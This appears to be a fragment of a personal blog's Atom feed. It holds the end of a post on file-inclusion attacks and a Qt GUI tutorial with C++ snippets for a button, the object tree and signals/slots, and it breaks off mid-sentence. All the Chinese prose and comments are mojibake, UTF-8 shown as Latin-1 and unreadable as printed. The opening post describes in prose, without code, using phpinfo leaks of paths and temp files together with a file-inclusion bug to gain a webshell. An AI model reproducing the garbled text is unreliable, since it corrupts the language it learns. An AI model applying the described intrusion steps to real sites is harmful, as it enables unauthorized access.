alt="image-20200928215935664"></p><p>çŸ¥é“çœŸå®ipçš„æˆ‘ä»¬å¯ä»¥çœå»cdnå¸¦æ¥çš„å„ç§å›°æ‰°ã€‚æˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥ç«¯å£æ—ç«™ä¸€é¡¿æ“ä½œã€‚</p><p> 3.webæ ¹ç›®å½•</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215944121.png" alt="image-20200928215944121"></p><p>ç½‘ç«™ç»å¯¹è·¯å¾„å¯¹æ¸—é€æµ‹è¯•ç›¸å½“çš„æœ‰ç”¨ï¼Œå½“ä½ æ‰¾åˆ°SQLæ³¨å…¥ç‚¹æ—¶ï¼Œè¦ä¸Šä¼ æœ¨é©¬çš„æ—¶å€™å°±éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„æ‰å¯ä»¥è·å–webshellã€‚å‡å¦‚è¯¥ç½‘ç«™ä½¿ç”¨çš„æ˜¯å¦‚xamppä¹‹ç±»çš„å¿«é€Ÿæ­å»ºçš„è½¯ä»¶ï¼Œä½ ä¾¿å¯ä»¥å¯»æ‰¾è¯¥è½¯ä»¶å¯¹åº”çš„æ¼æ´å»å°è¯•æ”»å‡»ç›®æ ‡ç½‘ç«™ã€‚</p><ol><li>disable_functions</li></ol><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215953280.png" alt="image-20200928215953280"></p><p>é€šè¿‡disable_functionsä½ å¯ä»¥äº†è§£åˆ°è¯¥ç½‘ç«™ç¦ç”¨äº†äº›ä»€ä¹ˆå‡½æ•°ï¼Œç„¶åå»ç»•è¿‡ä»£ç æ‰§è¡Œå’Œç¼–å†™webshellæ—¶é‡åˆ°çš„é—®é¢˜ã€‚</p><ol><li>ä¸´æ—¶æ–‡ä»¶è·¯å¾„</li><li><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928220004673.png" alt="image-20200928220004673"></li></ol><p>è¿™æ¬¡é€šè¿‡phpinfoæ¥getshellçš„å…³é”®ï¼Œphpinfoå¯ä»¥è®©æˆ‘ä»¬è·å¾—ä¸´æ—¶æ–‡ä»¶è·¯å¾„ã€‚å‘phpinfoé¡µé¢postæ¶æ„ä»£ç ï¼Œå¯ä»¥åœ¨_FILES[â€œfile1â€]ä¸­çœ‹åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœè¯¥ç½‘ç«™å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¾¿å¯ä»¥å°†æ¶æ„ä»£ç å­˜å‚¨æˆ‘ä»¬å·²çŸ¥çš„ç»å¯¹è·¯å¾„å»åŒ…å«å®ƒgetshellã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»Šå¤©åœ¨æ•´ç†ç¡¬ç›˜çš„ä¸€äº›ä¸œè¥¿ï¼Œæœ‰äº›webå­¦çš„ä¸œè¥¿åˆä¸æƒ³æ‰”ï¼Œå°±ä¼ ä¸Šæ¥ã€‚&lt;/p&gt;
&lt;h1 id=&quot;æ–‡ä»¶åŒ…å«&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶åŒ…å«&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶åŒ…å«&quot;&gt;&lt;/a&gt;æ–‡ä»¶åŒ…å«&lt;/h1&gt;&lt;h2 id=&quot;0x01å®šä¹‰&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="https://pz1o.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>å¤§äºŒç¨‹åºè®¾è®¡ç»¼åˆå®è·µ</title>
    <link href="https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/"/>
    <id>https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/</id>
    <published>2020-12-07T06:32:17.000Z</published>
    <updated>2020-12-14T00:41:59.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ"><a href="#ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ" class="headerlink" title="ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ"></a>ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ</h1><p>å›¾å½¢åŒ–ç¼–ç¨‹</p><p>è¿™ä¸åŒè¯­è¨€åˆ†æ•°è¿˜ä¸å¤ªä¸€æ ·ï¼Œæœ€åç”¨Qtäº†</p><p>å››ä¸ªæ˜ŸæœŸå››ä¸ªå®éªŒï¼Œåº”è¯¥é—®é¢˜ä¸å¤§</p><p>è¶ä¸‹æ¬¡æ¯”èµ›ä¹‹å‰æŠŠè¿™ä¸ªå®éªŒå¼„å®Œ</p><p>å…ˆè´´é“¾æ¥</p><p><a href="https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046</a></p><p>ä¸‹é¢å°½é‡ç”¨ä»£ç å’Œæ³¨é‡Šä»‹ç»åŸºç¡€çŸ¥è¯†ï¼Œå†™å¾—æœ‰ç‚¹ä¹±ï¼Œå¯ä»¥çœ‹bç«™å»å­¦</p><p>ä¸»è¦æ˜¯è‡ªå·±è®°å½•ä¸€ä¸‹çŸ¥è¯†</p><p>æˆ‘ç”¨çš„æ˜¯5.14çš„ bç«™åº”è¯¥æ˜¯5.5çš„ æœ‰äº›çŸ¥è¯†ä¼šæœ‰ç‚¹å‡ºå…¥</p><h1 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h1><h2 id="0x01-åˆ›å»ºqté¡¹ç›®"><a href="#0x01-åˆ›å»ºqté¡¹ç›®" class="headerlink" title="0x01 åˆ›å»ºqté¡¹ç›®"></a>0x01 åˆ›å»ºqté¡¹ç›®</h2><p>å®‰è£…å®Œæˆå</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/811f3f2557606ad0c304488b41000c5f.png" alt="image-20201014194802950"></p><p>å¯ä»¥å…ˆçœ‹ä¸€ä¸‹ä¸Šé¢è¿™ä¸ªå†…å®¹</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt5%20%E6%A8%A1%E5%9D%97.png" alt="Qt5 æ¨¡å—"></p><h3 id="1-æ–°å»ºé¡¹ç›®"><a href="#1-æ–°å»ºé¡¹ç›®" class="headerlink" title="1.æ–°å»ºé¡¹ç›®"></a>1.æ–°å»ºé¡¹ç›®</h3><p>é€‰ç¬¬ä¸€ä¸ª</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153603804.png" alt="image-20201207153603804"></p><p>ä¸€ç›´é»˜è®¤ï¼Œç›´åˆ°é€‰ç±»å<img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153634092.png" alt="image-20201207153634092"></p><p>ä¹‹åä¸€ç›´é»˜è®¤å°±å¯ä»¥äº†</p><p>æœ€ç»ˆç•Œé¢å¦‚å›¾</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153758775.png" alt="image-20201207153758775"></p><h3 id="2-proæ–‡ä»¶"><a href="#2-proæ–‡ä»¶" class="headerlink" title="2. .proæ–‡ä»¶"></a>2. .proæ–‡ä»¶</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QT       += core gui  <span class="comment">//åŒ…å«çš„æ¨¡å—</span></span><br><span class="line">greaterThan(QT_MAJOR_VERSION, <span class="number">4</span>): QT += widgets <span class="comment">//å¤§äºQt4ç‰ˆæœ¬ æ‰åŒ…å«widgetæ¨¡å—</span></span><br><span class="line">TARGET = QtFirst  <span class="comment">//åº”ç”¨ç¨‹åºå  ç”Ÿæˆçš„.exeç¨‹åºåç§°</span></span><br><span class="line">TEMPLATE = app    <span class="comment">//æ¨¡æ¿ç±»å‹    åº”ç”¨ç¨‹åºæ¨¡æ¿</span></span><br><span class="line">SOURCES += main.cpp\   <span class="comment">//æºæ–‡ä»¶</span></span><br><span class="line">        mywidget.cpp</span><br><span class="line">HEADERS  += mywidget.h   <span class="comment">//å¤´æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><blockquote><p><strong><em>\</em>.proå°±æ˜¯å·¥ç¨‹æ–‡ä»¶(project)ï¼Œå®ƒæ˜¯qmakeè‡ªåŠ¨ç”Ÿæˆçš„ç”¨äºç”Ÿäº§makefileçš„é…ç½®æ–‡ä»¶**</strong>ã€‚</p></blockquote><h3 id="3-main-cpp"><a href="#3-main-cpp" class="headerlink" title="3.main.cpp"></a>3.main.cpp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QApplication&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//a åº”ç”¨ç¨‹åºå¯¹è±¡ åœ¨Qtä¸­ æœ‰ä¸”ä»…æœ‰ä¸€ä¸ª</span></span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="comment">//çª—å£å¯¹è±¡ MainWindow</span></span><br><span class="line">    MainWindow w;</span><br><span class="line">    <span class="comment">//å¿…é¡»è¦showæ–¹æ³•æ‰å¯ä»¥å±•ç¤º</span></span><br><span class="line">    w.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£é‡Šï¼š</p><ul><li>Qtç³»ç»Ÿæä¾›çš„æ ‡å‡†ç±»åå£°æ˜å¤´æ–‡ä»¶æ²¡æœ‰.håç¼€</li><li>Qtä¸€ä¸ªç±»å¯¹åº”ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œç±»åå°±æ˜¯å¤´æ–‡ä»¶å</li><li>QApplicationåº”ç”¨ç¨‹åºç±»</li><li><ol><li>ç®¡ç†å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºçš„æ§åˆ¶æµå’Œä¸»è¦è®¾ç½®ã€‚</li><li>æ˜¯Qtçš„æ•´ä¸ªåå°ç®¡ç†çš„å‘½è„‰å®ƒ<strong>åŒ…å«ä¸»äº‹ä»¶å¾ªç¯**</strong>ï¼Œåœ¨å…¶ä¸­æ¥è‡ªçª—å£ç³»ç»Ÿå’Œå…¶å®ƒèµ„æºçš„<strong>*æ‰€æœ‰äº‹ä»¶å¤„ç†å’Œè°ƒåº¦ã€‚å®ƒä¹Ÿå¤„ç†åº”ç”¨ç¨‹åºçš„åˆå§‹åŒ–å’Œç»“æŸ</strong>ï¼Œå¹¶ä¸”<strong>æä¾›å¯¹è¯ç®¡ç†</strong>ã€‚</li><li>å¯¹äºä»»ä½•ä¸€ä¸ªä½¿ç”¨Qtçš„å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºï¼Œéƒ½æ­£å¥½å­˜åœ¨ä¸€ä¸ªQApplication å¯¹è±¡ï¼Œè€Œä¸è®ºè¿™ä¸ªåº”ç”¨ç¨‹åºåœ¨åŒä¸€æ—¶é—´å†…æ˜¯ä¸æ˜¯æœ‰0ã€1ã€2æˆ–æ›´å¤šä¸ªçª—å£ã€‚</li></ol></li><li><p>a.exec()</p></li></ul><p>ç¨‹åºè¿›å…¥æ¶ˆæ¯å¾ªç¯ï¼Œç­‰å¾…å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå“åº”ã€‚è¿™é‡Œmain()æŠŠæ§åˆ¶æƒè½¬äº¤ç»™Qtï¼ŒQtå®Œæˆäº‹ä»¶å¤„ç†å·¥ä½œï¼Œå½“åº”ç”¨ç¨‹åºé€€å‡ºçš„æ—¶å€™exec()çš„å€¼å°±ä¼šè¿”å›ã€‚<strong>åœ¨exec()ä¸­ï¼ŒQtæ¥å—å¹¶å¤„ç†ç”¨æˆ·å’Œç³»ç»Ÿçš„äº‹ä»¶å¹¶ä¸”æŠŠå®ƒä»¬ä¼ é€’ç»™é€‚å½“çš„çª—å£éƒ¨ä»¶ã€‚</strong></p><h3 id="4-å¿«æ·é”®åŠå‘½åè§„èŒƒ"><a href="#4-å¿«æ·é”®åŠå‘½åè§„èŒƒ" class="headerlink" title="4.å¿«æ·é”®åŠå‘½åè§„èŒƒ"></a>4.å¿«æ·é”®åŠå‘½åè§„èŒƒ</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å‘½åè§„èŒƒ </span></span><br><span class="line"><span class="comment">//ç±»å é¦–å­—æ¯å¤§å†™ï¼Œå•è¯å’Œå•è¯ä¹‹é—´é¦–å­—æ¯å¤§å†™</span></span><br><span class="line"><span class="comment">//å‡½æ•°å é¦–å­—æ¯å°å†™</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl + / æ³¨é‡Š</span></span><br><span class="line"><span class="comment">//ctrl + r è¿è¡Œ</span></span><br><span class="line"><span class="comment">//ctrl + b ç¼–è¯‘</span></span><br><span class="line"><span class="comment">//f1 å¸®åŠ©æ–‡æ¡£</span></span><br><span class="line"><span class="comment">//ctrl + shift + ä¸Š ä¸Šç§»</span></span><br><span class="line"><span class="comment">//ctrl + i å¯¹é½</span></span><br><span class="line"><span class="comment">//f4 åˆ‡æ¢.cpp å’Œ .h</span></span><br></pre></td></tr></table></figure><h2 id="0x02-æ–°å»ºQtç¨‹åº"><a href="#0x02-æ–°å»ºQtç¨‹åº" class="headerlink" title="0x02 æ–°å»ºQtç¨‹åº"></a>0x02 æ–°å»ºQtç¨‹åº</h2><h3 id="1-QPushButton"><a href="#1-QPushButton" class="headerlink" title="1.QPushButton"></a>1.QPushButton</h3><p>åˆ›å»ºæŒ‰é’®</p><p>æŠŠä¸‹é¢è¿™æ®µä»£ç å¤åˆ¶åˆ°widget.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">//æŒ‰é’®æ“ä½œ</span></span><br><span class="line">  <span class="comment">//åˆ›å»ºç¬¬ä¸€ä¸ªæŒ‰é’®</span></span><br><span class="line">    QPushButton * btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    <span class="comment">//showä»¥é¡¶å±‚æ–¹å¼å¼¹å‡ºæ§ä»¶</span></span><br><span class="line">    btn-&gt;show(); </span><br><span class="line">    <span class="comment">//è®¾ç½®çˆ¶äº²</span></span><br><span class="line">    btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//æ˜¾ç¤ºæ–‡æœ¬</span></span><br><span class="line">    btn-&gt;setText(<span class="string">"ç¬¬ä¸€ä¸ª"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ­¤å¤–è¿˜æœ‰ç¬¬äºŒç§æ–¹æ³•è¿›è¡Œæ“ä½œ</span></span><br><span class="line">    <span class="comment">//åˆ›å»ºç¬¬äºŒä¸ªæŒ‰é’®</span></span><br><span class="line">    <span class="comment">//æŒ‰ç…§æ§ä»¶å¤§å°åˆ›å»ºçª—å£</span></span><br><span class="line">    QPushButton * btn2 = <span class="keyword">new</span> QPushButton(<span class="string">"ç¬¬äºŒä¸ª"</span>,<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//ç§»åŠ¨btn2æŒ‰é’®</span></span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="comment">//é‡ç½®æŒ‰é’®å¤§å°</span></span><br><span class="line">    btn2-&gt;resize(<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//çª—å£æ“ä½œ</span></span><br><span class="line">    <span class="comment">//é‡ç½®çª—å£å¤§å°</span></span><br><span class="line">    resize(<span class="number">600</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®å›ºå®šçª—å£å¤§å°</span></span><br><span class="line">    <span class="comment">//setFixedSize(600,400);</span></span><br><span class="line">    <span class="comment">//è®¾ç½®çª—å£æ ‡é¢˜</span></span><br><span class="line">    setWindowTitle(<span class="string">"è®¡ç®—å™¨"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155120350.png" alt="image-20201207155120350"></p><h3 id="2-å¯¹è±¡æ ‘"><a href="#2-å¯¹è±¡æ ‘" class="headerlink" title="2.å¯¹è±¡æ ‘"></a>2.å¯¹è±¡æ ‘</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155310260.png" alt="image-20201207155310260"></p><p>è‡ªå·±åˆ›å»ºä¸€ä¸ªMyPushButton</p><p>åŒæ—¶ç»§æ‰¿QPushButton</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155345296.png" alt="image-20201207155345296"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111505680.png" alt="image-20201207111505680"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111746909.png" alt="image-20201207111746909"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111806797.png" alt="image-20201207111806797"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111921782.png" alt="image-20201207111921782"></p><p>ä»£ç å¦‚ä¸‹</p><p><code>mypushbutton.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mypushbutton.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æŒ‰é’®æ„é€ è°ƒç”¨"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyPushButton::~MyPushButton()</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æŒ‰é’®æ„é€ ææ„"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mypushbutton.h</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYPUSHBUTTON_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYPUSHBUTTON_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPushButton</span> :</span> <span class="keyword">public</span> QPushButton</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MyPushButton</span><span class="params">(QWidget *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">     ~MyPushButton();</span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYPUSHBUTTON_H</span></span></span><br></pre></td></tr></table></figure><p><code>widget.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºè‡ªå·±æŒ‰é’®å¯¹è±¡</span></span><br><span class="line">MyPushButton *btn3 = <span class="keyword">new</span> MyPushButton;</span><br><span class="line">btn3-&gt;show();</span><br><span class="line">btn3-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">btn3-&gt;setText(<span class="string">"æˆ‘çš„æŒ‰é’®"</span>);</span><br><span class="line">btn3-&gt;<span class="built_in">move</span>(<span class="number">200</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>å›¾ç¤ºå¦‚ä¸‹</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207215449993.png" alt="image-20201207215449993"></p><h2 id="0x03-ä¿¡å·å’Œæ§½çš„æœºåˆ¶"><a href="#0x03-ä¿¡å·å’Œæ§½çš„æœºåˆ¶" class="headerlink" title="0x03 ä¿¡å·å’Œæ§½çš„æœºåˆ¶"></a>0x03 ä¿¡å·å’Œæ§½çš„æœºåˆ¶</h2><h3 id="1-ä¿¡å·å’Œæ§½"><a href="#1-ä¿¡å·å’Œæ§½" class="headerlink" title="1.ä¿¡å·å’Œæ§½"></a>1.ä¿¡å·å’Œæ§½</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD%20.png" alt="Qtä¿¡å·å’Œæ§½ "></p><p>åŸºæœ¬çš„æ¥å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ç»™æˆ‘çš„æŒ‰é’®ä¸€ä¸ªå…³é—­çª—å£çš„åŠŸèƒ½</span><br><span class="line">&#x2F;&#x2F;å‚æ•°1 ä¿¡å·å‘é€è€… å‚æ•°2 å‘é€çš„ä¿¡å·(å‡½æ•°åœ°å€) å‚æ•°3 ä¿¡å·æ¥æ”¶è€… å‚æ•°4 å¤„ç†çš„æ§½å‡½æ•°</span><br><span class="line">connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close);</span><br></pre></td></tr></table></figure><h4 id="è‡ªå®šä¹‰ä¿¡å·å’Œæ§½"><a href="#è‡ªå®šä¹‰ä¿¡å·å’Œæ§½" class="headerlink" title="è‡ªå®šä¹‰ä¿¡å·å’Œæ§½"></a><strong>è‡ªå®šä¹‰ä¿¡å·å’Œæ§½</strong></h4><p>è‡ªå®šä¹‰ä¿¡å·</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„.hæ–‡ä»¶ä¸‹</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="comment">//è‡ªå®šä¹‰ä¿¡å· å†™åœ¨signalsä¸‹</span></span><br><span class="line">    <span class="comment">//è¿”å›å€¼æ˜¯void åªéœ€è¦å£°æ˜ ä¸éœ€è¦å®ç°</span></span><br><span class="line">    <span class="comment">//å¯ä»¥æœ‰å‚æ•°ï¼Œå¯ä»¥é‡è½½</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰æ§½</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„.æ–‡ä»¶publicä¸­</span></span><br><span class="line"><span class="keyword">public</span></span><br><span class="line">    <span class="comment">//è¿”å›å€¼æ˜¯void éœ€è¦å£°æ˜ éœ€è¦å®ç°</span></span><br><span class="line">    <span class="comment">//å¯ä»¥æœ‰å‚æ•°ï¼Œå¯ä»¥é‡è½½</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åœ¨ç±»çš„.cppä¸­å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyPushButton::recv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸ"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›è¡Œä¸€ä¸ª<strong>å°çš„æ¡ˆä¾‹</strong></p><blockquote><p>ä¸€ä¸ªæŒ‰é’®å“èµ·ä¹‹å 